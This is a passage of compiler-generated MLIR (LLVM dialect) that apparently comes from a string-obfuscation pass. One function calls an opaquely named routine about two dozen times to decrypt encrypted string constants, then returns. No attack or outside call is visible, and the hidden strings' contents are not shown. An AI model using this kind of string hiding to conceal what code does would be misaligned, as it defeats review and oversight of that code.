    %192 = llvm.mlir.constant(35 : i32) : i32
    %193 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%193, %192) : (!llvm.ptr, i32) -> ()
    %194 = llvm.mlir.constant(16 : i32) : i32
    %195 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%195, %194) : (!llvm.ptr, i32) -> ()
    %196 = llvm.mlir.constant(11 : i32) : i32
    %197 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%197, %196) : (!llvm.ptr, i32) -> ()
    %198 = llvm.mlir.constant(37 : i32) : i32
    %199 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%199, %198) : (!llvm.ptr, i32) -> ()
    %200 = llvm.mlir.constant(31 : i32) : i32
    %201 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%201, %200) : (!llvm.ptr, i32) -> ()
    %202 = llvm.mlir.constant(50 : i32) : i32
    %203 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%203, %202) : (!llvm.ptr, i32) -> ()
    %204 = llvm.mlir.constant(26 : i32) : i32
    %205 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%205, %204) : (!llvm.ptr, i32) -> ()
    %206 = llvm.mlir.constant(32 : i32) : i32
    %207 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%207, %206) : (!llvm.ptr, i32) -> ()
    %208 = llvm.mlir.constant(26 : i32) : i32
    %209 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%209, %208) : (!llvm.ptr, i32) -> ()
    %210 = llvm.mlir.constant(28 : i32) : i32
    %211 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%211, %210) : (!llvm.ptr, i32) -> ()
    %212 = llvm.mlir.constant(49 : i32) : i32
    %213 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%213, %212) : (!llvm.ptr, i32) -> ()
    %214 = llvm.mlir.constant(24 : i32) : i32
    %215 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%215, %214) : (!llvm.ptr, i32) -> ()
    %216 = llvm.mlir.constant(27 : i32) : i32
    %217 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%217, %216) : (!llvm.ptr, i32) -> ()
    %218 = llvm.mlir.constant(44 : i32) : i32
    %219 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%219, %218) : (!llvm.ptr, i32) -> ()
    %220 = llvm.mlir.constant(55 : i32) : i32
    %221 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%221, %220) : (!llvm.ptr, i32) -> ()
    %222 = llvm.mlir.constant(36 : i32) : i32
    %223 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%223, %222) : (!llvm.ptr, i32) -> ()
    %224 = llvm.mlir.constant(51 : i32) : i32
    %225 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%225, %224) : (!llvm.ptr, i32) -> ()
    %226 = llvm.mlir.constant(57 : i32) : i32
    %227 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%227, %226) : (!llvm.ptr, i32) -> ()
    llvm.return
  }
}

